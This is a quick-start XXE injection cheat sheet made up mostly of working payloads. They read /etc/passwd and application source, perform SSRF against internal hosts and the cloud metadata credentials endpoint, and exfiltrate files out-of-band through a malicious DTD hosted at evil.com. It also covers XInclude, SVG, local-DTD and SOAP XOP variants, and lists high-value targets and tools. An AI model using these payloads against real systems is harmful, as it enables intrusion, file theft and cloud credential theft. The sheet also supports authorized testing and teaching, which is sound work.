# XXE Injection — Quick Start

## 60-second smoke test

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<root>&test;</root>' http://target/api/xml
```

If `/etc/passwd` content appears in the response → XXE vulnerable.

## File retrieval

**Linux:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Windows:**
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
```

**Read source code:**
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]>
```

If special chars (`<`, `&`) break parsing, use base64 wrapper:
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">]>
```

## SSRF via XXE

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal-host:8080/admin">]>
<root>&xxe;</root>
```

Cloud metadata:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

## Blind XXE (out-of-band exfil)

Host on attacker server (`evil.com`):

```xml
<!-- Malicious DTD: evil.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil.com/?d=%data;'>">
%param1;
```

Trigger payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
  %remote;
  %exfil;
]>
<root>1</root>
```

Receive `/etc/passwd` content as URL parameter at evil.com.

## XInclude (when XXE filtered but XInclude allowed)

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

## SVG upload

When app accepts image uploads and processes SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
</svg>
```

## Local DTD repurposing

When network egress blocked, abuse local DTDs to leak data via error message:

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso 'AAA)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>1</message>
```

Common local DTDs:
- `/usr/share/yelp/dtd/docbookx.dtd`
- `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
- `C:\Windows\System32\wbem\xml\cim20.dtd`

## XOP/MTOM SSRF (SOAP services)

SOAP endpoints with XOP attachment support:

```xml
POST /soap HTTP/1.1
Content-Type: multipart/related; type="application/xop+xml"; boundary=BOUNDARY

--BOUNDARY
Content-Type: application/xop+xml

<soap:Envelope ...>
  <soap:Body>
    <data><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
                       href="http://internal-host/admin"/></data>
  </soap:Body>
</soap:Envelope>
--BOUNDARY
```

The `xop:Include href` triggers a server-side fetch — SSRF.

## Burp / cURL workflow

```bash
# Capture XML POST in Burp
# Repeater → modify body to inject DOCTYPE/ENTITY
# Send → check response for file content
```

Curl one-liner:
```bash
curl -X POST -H "Content-Type: application/xml" -d @payload.xml http://target/api
```

## Detection checklist

- [ ] XML accepted at any endpoint?
- [ ] Verbose XML errors leaked?
- [ ] DOCTYPE / ENTITY parsed?
- [ ] External entities resolved?
- [ ] Network egress allowed (for OAST)?
- [ ] SVG / DOCX / XLSX / SOAP / XML-RPC accepted?
- [ ] WSDL / XJC / SAX / DOM4J in source?

## When each works

| Technique | Use when |
|---|---|
| File retrieval | XXE allowed, output reflected |
| SSRF | Network egress allowed, no need for output |
| Blind | Output not reflected, network egress allowed |
| Local DTD | XXE allowed, NO network egress |
| XInclude | DOCTYPE blocked but XInclude works |
| SVG | Image upload feature processing SVG server-side |
| XOP/MTOM | SOAP service supports MTOM attachments |

## High-value targets

- SOAP / WSDL endpoints (`/soap`, `/services`).
- DOCX / ODT / XLSX upload (zip-with-xml).
- SVG upload (especially with rendering / preview).
- XML-RPC endpoints (`xmlrpc.php` for WordPress).
- Office Web Apps / collaborative editors.
- Salesforce / SAP / Java EE apps (heavy XML).

## Tools

- Burp Suite (manual).
- XXEinjector (Ruby): https://github.com/enjoiz/XXEinjector
- xxer.py (Python).
- ngrok / Burp Collaborator for blind XXE.

## References

- OWASP XXE Prevention Cheat Sheet.
- CWE-611: Improper Restriction of XML External Entity.
- PortSwigger XXE labs: https://portswigger.net/web-security/xxe
